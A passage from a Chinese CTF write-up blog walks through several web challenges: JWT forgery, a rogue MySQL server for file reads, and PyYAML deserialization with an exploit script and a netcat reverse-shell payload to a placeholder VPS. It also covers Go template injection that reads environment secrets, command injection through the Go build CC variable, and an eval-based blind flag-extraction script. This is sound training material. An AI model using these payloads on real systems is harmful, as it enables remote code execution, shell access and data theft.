alt="image-20251111183903444"></p><p>抓包查看有<strong>Authorization</strong>，jwt形式，先尝试爆破key，然后来构造admin</p><p><img src="/../images/image-20251111222118644.png" alt="image-20251111222118644"></p><p><img src="/../images/image-20251111185058396.png" alt="image-20251111185058396"></p><p><img src="/../images/image-20251111185113746.png" alt="image-20251111185113746"></p><p>伪造了admin之后，显示不能连接本地的mysql是不是就能连别的数据库，mysql任意连接，找exp来打</p><p><img src="/../images/image-20251111222320934.png" alt="image-20251111222320934"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/allyshka/Rogue-MySql-Server</span><br></pre></td></tr></table></figure><p>修改端口号【也可以不改】，和读取的文件app.py，就可以在自己的vps上面启python服务，然后读的文件在mysql.log当中</p><p><img src="/../images/image-20251111225148377.png" alt="image-20251111225148377"></p><p>为什么读app.py呢 因为识别到相应的【python-flask】了</p><p><img src="/../images/image-20251111225819442.png" alt="image-20251111225819442"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import yaml</span><br><span class="line">import MySQLdb</span><br><span class="line">from flask import Flask, request, jsonify, render_template, redirect</span><br><span class="line">from functools import wraps</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(24)</span><br><span class="line"></span><br><span class="line">def login_required(f):</span><br><span class="line">    @wraps(f)</span><br><span class="line">    def decorated_function(*args, **kwargs):</span><br><span class="line">        token = request.headers.get(&#x27;Authorization&#x27;, &#x27;&#x27;).replace(&#x27;Bearer &#x27;, &#x27;&#x27;)</span><br><span class="line">        if not token or token not in [&#x27;admin&#x27;, &#x27;user&#x27;]:</span><br><span class="line">            return jsonify(&#123;&quot;error&quot;: &quot;Unauthorized&quot;&#125;), 401</span><br><span class="line">        request.current_user = token</span><br><span class="line">        return f(*args, **kwargs)</span><br><span class="line">    return decorated_function</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return redirect(&#x27;/login&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;)</span><br><span class="line">def login():</span><br><span class="line">    return &#x27;&#x27;&#x27;</span><br><span class="line">    &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="line">        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def do_login():</span><br><span class="line">    username = request.form.get(&#x27;username&#x27;, &#x27;&#x27;)</span><br><span class="line">    password = request.form.get(&#x27;password&#x27;, &#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">    if username == &#x27;admin&#x27; and password == os.getenv(&#x27;ADMIN_PASS&#x27;, &#x27;admin123&#x27;):</span><br><span class="line">        return jsonify(&#123;&quot;token&quot;: &quot;admin&quot;&#125;)</span><br><span class="line">    elif username == &#x27;user&#x27; and password == &#x27;user123&#x27;:</span><br><span class="line">        return jsonify(&#123;&quot;token&quot;: &quot;user&quot;&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Invalid credentials&quot;&#125;), 401</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/dashboard&#x27;)</span><br><span class="line">@login_required</span><br><span class="line">def dashboard():</span><br><span class="line">    if request.current_user == &#x27;admin&#x27;:</span><br><span class="line">        return &#x27;&#x27;&#x27;</span><br><span class="line">        &lt;!DOCTYPE html&gt;</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;title&gt;Admin Dashboard&lt;/title&gt;</span><br><span class="line">            &lt;style&gt;</span><br><span class="line">            .container &#123;max-width: 800px; margin: 0 auto; padding: 20px;&#125;</span><br><span class="line">            input, button &#123;margin: 5px; padding: 8px;&#125;</span><br><span class="line">            input &#123;width: 200px;&#125;</span><br><span class="line">            &lt;/style&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">            &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">                &lt;h3&gt;🐙 测试 MySQL 连接&lt;/h3&gt;</span><br><span class="line">                &lt;form id=&quot;f&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;host&quot; placeholder=&quot;Host&quot; value=&quot;127.0.0.1&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;port&quot; placeholder=&quot;Port&quot; value=&quot;3306&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;user&quot; placeholder=&quot;User&quot; value=&quot;root&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;password&quot; placeholder=&quot;Password&quot; type=&quot;password&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;db&quot; placeholder=&quot;Database&quot; value=&quot;mysql&quot;&gt;</span><br><span class="line">                    &lt;button type=&quot;button&quot; onclick=&quot;test()&quot;&gt;测试连接&lt;/button&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">                &lt;pre id=&quot;out&quot;&gt;&lt;/pre&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;script&gt;</span><br><span class="line">                const token = localStorage.getItem(&#x27;token&#x27;);</span><br><span class="line">                if(!token) location.href=&#x27;/&#x27;;</span><br><span class="line">                </span><br><span class="line">                async function test()&#123;</span><br><span class="line">                    const out = document.getElementById(&#x27;out&#x27;);</span><br><span class="line">                    out.textContent = &#x27;正在测试...&#x27;;</span><br><span class="line">                    let data = Object.fromEntries(new FormData(f).entries());</span><br><span class="line">                    try&#123;</span><br><span class="line">                        let res = await fetch(&#x27;/test_mysql&#x27;, &#123;</span><br><span class="line">                            method: &#x27;POST&#x27;,</span><br><span class="line">                            headers: &#123;</span><br><span class="line">                                &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,</span><br><span class="line">                                &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token</span><br><span class="line">                            &#125;,</span><br><span class="line">                            body: JSON.stringify(data)</span><br><span class="line">                        &#125;);</span><br><span class="line">                        let j = await res.json();</span><br><span class="line">                        out.style.color = j.success ? &#x27;green&#x27; : &#x27;red&#x27;;</span><br><span class="line">                        out.textContent = j.success ? &#x27;连接成功！&#x27; : &#x27;连接失败\\n&#x27; + (j.error || &#x27;&#x27;);</span><br><span class="line">                    &#125; catch(e) &#123;</span><br><span class="line">                        out.textContent = &#x27;请求出错：&#x27; + e;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &lt;/script&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;&lt;h3&gt;User Dashboard&lt;/h3&gt;&lt;p&gt;Welcome, user!&lt;/p&gt;&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/test_mysql&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">@login_required</span><br><span class="line">def test_mysql():</span><br><span class="line">    if request.current_user != &#x27;admin&#x27;:</span><br><span class="line">        return jsonify(&#123;</span><br><span class="line">            &quot;success&quot;: False, </span><br><span class="line">            &quot;error&quot;: &quot;权限不足，只有 admin 可以测试 MySQL 连接&quot;</span><br><span class="line">        &#125;), 403</span><br><span class="line">    </span><br><span class="line">    data = request.get_json() or &#123;&#125;</span><br><span class="line">    for k in (&quot;host&quot;, &quot;port&quot;, &quot;user&quot;, &quot;password&quot;, &quot;db&quot;):</span><br><span class="line">        if k not in data:</span><br><span class="line">            return jsonify(&#123;&quot;success&quot;: False, &quot;error&quot;: f&quot;缺少字段: &#123;k&#125;&quot;&#125;)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        conn = MySQLdb.connect(</span><br><span class="line">            host=data[&quot;host&quot;],</span><br><span class="line">            port=int(data[&quot;port&quot;]),</span><br><span class="line">            user=data[&quot;user&quot;],</span><br><span class="line">            passwd=data[&quot;password&quot;],</span><br><span class="line">            db=data[&quot;db&quot;],</span><br><span class="line">            connect_timeout=5,</span><br><span class="line">            charset=&#x27;utf8mb4&#x27;,</span><br><span class="line">            local_infile=1,</span><br><span class="line">            ssl=None</span><br><span class="line">        )</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(&quot;SELECT 1&quot;)</span><br><span class="line">        cur.close()</span><br><span class="line">        conn.close()</span><br><span class="line">        </span><br><span class="line">        return jsonify(&#123;&quot;success&quot;: True&#125;)</span><br><span class="line">    except MySQLdb.Error as e:</span><br><span class="line">        return jsonify(&#123;&quot;success&quot;: False, &quot;error&quot;: str(e)&#125;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;success&quot;: False, &quot;error&quot;: f&quot;其他错误: &#123;e&#125;&quot;&#125;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/uneed1t&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def uneed1t():</span><br><span class="line">    data = request.args.get(&#x27;data&#x27;, &#x27;&#x27;)</span><br><span class="line">    if data == &#x27;&#x27;:</span><br><span class="line">        return jsonify(&#123;&quot;result&quot;: &quot;null&quot;&#125;)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        black_list = [&quot;system&quot;, &quot;popen&quot;, &quot;run&quot;, &quot;os&quot;]</span><br><span class="line">        </span><br><span class="line">        for forb in black_list:</span><br><span class="line">            if forb in data:</span><br><span class="line">                return jsonify(&#123;&quot;result&quot;: &quot;error&quot;&#125;)</span><br><span class="line">        </span><br><span class="line">        yaml.load(data, Loader=yaml.Loader)</span><br><span class="line">        return jsonify(&#123;&quot;result&quot;: &quot;ok&quot;&#125;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;result&quot;: &quot;error&quot;&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=8000)</span><br></pre></td></tr></table></figure><p>审计多出来的路由&#x2F;uneed1t的代码段，发现使用了yaml.load做加载器，即使使用了黑名单限制了一写操作，还是可以用 <code>subprocess</code>模块执行命令打yaml反序列化漏洞</p><p><img src="/../images/image-20251111234324363.png" alt="image-20251111234324363"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/7518</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251111233615270.png" alt="image-20251111233615270"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;!!python/object/apply:subprocess.Popen</span><br><span class="line">- [&quot;sh&quot;,&quot;-c&quot;,&quot;cat /f* &gt;1.txt&quot;]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;!!python/object/apply:subprocess.call</span><br><span class="line">[[&#x27;/bin/busybox&#x27;,&#x27;nc&#x27;,&#x27;xx.xx.xx.xx&#x27;,&#x27;11111&#x27;,&#x27;-e&#x27;,&#x27;/bin/sh&#x27;]]</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p>脚本【叫ai写的 嘻嘻】：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># 目标URL - 请修改为实际目标</span><br><span class="line">target_url = &quot;http://target.com:8000/uneed1t&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 1. 任意文件读取</span><br><span class="line">payload = &quot;&quot;&quot;!!python/object/apply:subprocess.Popen</span><br><span class="line">- [&quot;sh&quot;,&quot;-c&quot;,&quot;cat /f* &gt;1.txt&quot;]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># 2. 反弹shell</span><br><span class="line"># payload = &quot;&quot;&quot;!!python/object/apply:subprocess.call</span><br><span class="line"># [[&#x27;/bin/busybox&#x27;,&#x27;nc&#x27;,&#x27;YOUR_VPS_IP&#x27;,&#x27;YOUR_PORT&#x27;,&#x27;-e&#x27;,&#x27;/bin/sh&#x27;]]</span><br><span class="line"># &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># 编码并发送请求</span><br><span class="line">encoded_payload = urllib.parse.quote(payload)</span><br><span class="line">full_url = f&quot;&#123;target_url&#125;?data=&#123;encoded_payload&#125;&quot;</span><br><span class="line"></span><br><span class="line">response = requests.get(full_url)</span><br><span class="line">print(f&quot;状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line">print(f&quot;响应: &#123;response.text&#125;&quot;)</span><br></pre></td></tr></table></figure><h3 id="VIP"><a href="#VIP" class="headerlink" title="VIP"></a><strong>VIP</strong></h3><h4 id="考点：go-ssti-劫持环境变量提权"><a href="#考点：go-ssti-劫持环境变量提权" class="headerlink" title="考点：go ssti+劫持环境变量提权"></a>考点：go ssti+劫持环境变量提权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们全新的PaaS平台提供了一个强大的Go模板服务作为免费套餐。对于我们的VIP客户，我们还提供了一项专属功能：一个独立的在线Go编译器！</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/Joooook/p/18089714</span><br><span class="line">https://xz.aliyun.com/news/15003</span><br></pre></td></tr></table></figure><p>给了源码，来看看什么样的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有一个api鉴权中间件，服务启动时必须 export API_KEY=xxxxxxxx，否则 panic。Gin 中间件函数：取请求头 X-API-Key → 与后台比对 → 不对就 401 打断</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112125915544.png" alt="image-20251112125915544"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求方式和形式 POST，json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112130237633.png" alt="image-20251112130237633"></p><p>只有&#x2F;build路由进行了api鉴权</p><p><img src="/../images/image-20251112143715466.png" alt="image-20251112143715466"></p><p>关键渲染模板点在<code>/api</code> 接口把用户输入直接拼进 template 做渲染，可远程执行任意模板语法 </p><p><img src="/../images/image-20251112143959688.png" alt="image-20251112143959688"></p><p>模板渲染，用Utils⾥的GetReader函数读⽂件，获得X-API-Key</p><p><img src="/../images/image-20251112165010588.png" alt="image-20251112165010588"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; .Utils.GetReader &quot;/proc/self/environ&quot; | .Utils.ReadAll &#125;&#125; 将环境变量全部读出来，发现有个/app/secret_key.txt</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112165049976.png" alt="image-20251112165049976"></p><p><img src="/../images/image-20251112165131900.png" alt="image-20251112165131900"></p><p>那么我们也就拿到了X-API-Key，就可以过了&#x2F;vip&#x2F;build的鉴权控制部分，到了buildHandler部分</p><p><img src="/../images/image-20251112172922246.png" alt="image-20251112172922246"></p><p>将用户的输入源码和环境变量原封不动【信任状态】的写盘和编译，成功就下载相应的二进制文件，失败返回回显</p><p>但是正常写入go源码当中并不会执行命令，设置”CGO_ENABLED”: “1”，go build就会调用外部 C 编译器(默认是 <code>gcc</code>）</p><p>既可以理解等于 build 进程先帮我们执行任意命令【但是结果不能回显】，然后落盘到固定编译的目录&#x2F;build下</p><p>运用go:embed【它允许开发者在编译时将静态资源文件嵌入到可执行文件中】，将不出网的执行命令结果进行显示</p><p>将可读可写的文件【可能含有flag】写入到s.txt然后dump下来二进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\nimport \&quot;C\&quot;\n\nfunc main() &#123;&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;,</span><br><span class="line">    &quot;CC&quot;: &quot;/bin/sh -c &#x27;find / -type f -perm /4000 2&gt;/dev/null &gt; /tmp/build/s.txt; gcc \&quot;$@\&quot;&#x27; gcc-shim&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\n\nimport (\n\t\&quot;embed\&quot;\n\t\&quot;os\&quot;\n)\n\n//go:embed s.txt\nvar f []byte\n\nfunc main() &#123;\n\tos.Stdout.Write(f)\n&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112191029341.png" alt="image-20251112191029341"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\nimport \&quot;C\&quot;\n\nfunc main() &#123;&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;,</span><br><span class="line">    &quot;CC&quot;: &quot;/bin/sh -c &#x27;/usr/local/bin/flagread /flag.txt &gt; /tmp/build/flag.txt; gcc \&quot;$@\&quot;&#x27; gcc-shim&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: &quot;package main\n\nimport (\n\t\&quot;embed\&quot;\n\t\&quot;os\&quot;\n)\n\n//go:embed s.txt\nvar f []byte\n\nfunc main() &#123;\n\tos.Stdout.Write(f)\n&#125;&quot;,</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;CGO_ENABLED&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;GOOS&quot;: &quot;linux&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将dump下来的文件搜素flag或者 常规来说应该会出现像wp一样的文件路劲，但是我没有找到也不知道为什么</p><p><img src="/../images/image-20251112192018461.png" alt="image-20251112192018461"></p><p><img src="/../images/image-20251112191046950.png" alt="image-20251112191046950"></p><p>后面和上面一样将相应地址下的flag文件dump下来找flag就好了 但是依旧没有找到，可能环境出问题【不懂】</p><p><img src="/../images/image-20251112192141963.png" alt="image-20251112192141963"></p><p><img src="/../images/image-20251112191657594.png" alt="image-20251112191657594"></p><p>个人感觉正常来说应该是告诉了flag文件路劲，然后在模板渲染打的任意文件读取的时候，查找发现没有权限，才会有想到劫持环境变量中的cc来进行提权进行rce来读取flag，但是wp没有这一块就显得不太连贯【有提到一嘴但是复现的时候没有感受出来】，像下面查询flag然后弹出权限不够之类的【复现的时候没有出现flag，没办法验证】，然后再拿着key去进行构造payload合理一点，也有可能是我复现的时候失误了，跳过了，嘻嘻</p><p><img src="/../images/image-20251112194342982.png" alt="image-20251112194342982"></p><p><img src="/../images/image-20251112193943019.png" alt="image-20251112193943019"></p><h3 id="这又是什么函数"><a href="#这又是什么函数" class="headerlink" title="这又是什么函数"></a>这又是什么函数</h3><h4 id="考点：Python-Flask内存马"><a href="#考点：Python-Flask内存马" class="headerlink" title="考点：Python Flask内存马"></a>考点：Python Flask内存马</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没见过？搜一下！在/flag</span><br></pre></td></tr></table></figure><p>熟悉的页面，熟悉的目录扫描，熟悉的&#x2F;src，不一样的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/doit&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def doit():</span><br><span class="line">    e=request.form.get(&#x27;e&#x27;)</span><br><span class="line">    try:</span><br><span class="line">        eval(e)</span><br><span class="line">        return &quot;done!&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &quot;error!&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def src():</span><br><span class="line">    return open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=5000)</span><br></pre></td></tr></table></figure><p>关注点在&#x2F;doit路由下面的eval(e)【eval()函数⽤来执⾏⼀个字符串表达式，并返回表达式的值。】执行命令</p><p><img src="/../images/image-20251112194838981.png" alt="image-20251112194838981"></p><p>尝试执行命令和源码显示的一样，显示done无回显</p><p><img src="/../images/image-20251112200056348.png" alt="image-20251112200056348"></p><p>爆破【布尔盲注原理】:</p><p>官方wp当中的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://challenge.ilovectf.cn:30667/doit&quot;</span><br><span class="line">chars = &quot;_-&#123;&#125;!abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    for c in chars:</span><br><span class="line">        payload = &#123;</span><br><span class="line">            &#x27;e&#x27;: f&#x27;__import__(&quot;os&quot;).system(&quot;&quot;) if open(&quot;/flag&quot;).read()[&#123;i-1&#125;] == &quot;&#123;c&#125;&quot; else 1/0&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=payload)</span><br><span class="line">        if &quot;done!&quot; in r.text:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        break  # 内层 for 正常结束（未找到字符），认为 flag 已结束</span><br><span class="line"></span><br><span class="line">print(&quot;Final flag:&quot;, flag)</span><br></pre></td></tr></table></figure><p>内存马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/13858</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 